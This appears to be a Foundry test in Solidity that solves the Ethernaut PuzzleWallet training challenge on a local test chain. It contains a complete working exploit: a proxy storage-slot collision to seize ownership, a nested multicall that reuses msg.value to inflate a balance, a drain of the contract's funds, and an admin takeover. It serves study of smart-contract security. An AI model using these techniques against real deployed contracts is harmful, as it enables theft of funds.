// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/openzeppelin-ethernaut/PuzzleWallet.sol";

// 1. exploit the wrong layout of the implementation not reserving storage slots for the proxy
// 2. use an inner multicall to bypass the reentrancy lock on the outer multicall's stack frame
// 3. delegatecall preserves msg.value and msg.sender
// 4. not using a plain inner call cuz address.call() doesn't preserve msg.sender; it's the caller of address.call()
contract PuzzleWalletTest is Test {
    PuzzleWallet instance;
    PuzzleWallet walletLogic;
    PuzzleProxy proxy;
    address attacker = makeAddr("attacker");
    uint256 initialBalance = 0.1 ether;

    function setUp() public {
        walletLogic = new PuzzleWallet();
        bytes memory data = abi.encodeWithSelector(
            PuzzleWallet.init.selector,
            100 ether
        );
        proxy = new PuzzleProxy(address(this), address(walletLogic), data);
        assertEq(proxy.admin(), address(this));

        instance = PuzzleWallet(address(proxy));

        vm.deal(address(this), initialBalance);
        instance.addToWhitelist(address(this));
        instance.deposit{value: initialBalance}();
    }

    function test() public {
        vm.deal(attacker, initialBalance);

        // 1. proposeNewAdmin() to become the owner bcs of the wrong impl. layout
        vm.startPrank(attacker);
        proxy.proposeNewAdmin(attacker);
        assertEq(proxy.pendingAdmin(), attacker);
        assertEq(instance.owner(), attacker);

        // 2. addToWhitelist() to bypass onlyWhitelisted
        instance.addToWhitelist(attacker);
        assertEq(instance.whitelisted(attacker), true);

        bytes memory depositSelector = abi.encodeWithSelector(
            PuzzleWallet.deposit.selector
        );

        // 3. multicall() with deposit() and another inner multicall(), which includes another deposit()
        //    to avoid depositCalled restriction & reuse msg.value for the second time
        //    s.t. balances[msg.sender] = 0.2 and can withdraw all, depleting address(instance).balance
        bytes[] memory innerData = new bytes[](1);
        innerData[0] = depositSelector;

        bytes[] memory outerData = new bytes[](2);
        outerData[0] = depositSelector;
        outerData[1] = abi.encodeWithSelector(
            PuzzleWallet.multicall.selector,
            innerData
        );
        // console.logBytes(outerData[0]);
        // console.logBytes(outerData[1]);

        instance.multicall{value: initialBalance}(outerData);
        assertEq(instance.balances(attacker), initialBalance * 2);
        assertEq(attacker.balance, 0);

        // 4. execute() with the address's total balance 0.2 can make address(instance).balance == 0
        instance.execute(attacker, initialBalance * 2, bytes(""));
        assertEq(address(instance).balance, 0);
        assertEq(attacker.balance, initialBalance * 2);

        // 5. setMaxBalance() with the casting from the address of the attacker to become admin()
        instance.setMaxBalance(uint256(uint160(attacker)));
        assertEq(proxy.admin(), attacker);
        // console.logUint(uint256(uint160(vm.envAddress("MY_ADDRESS"))));
    }
}
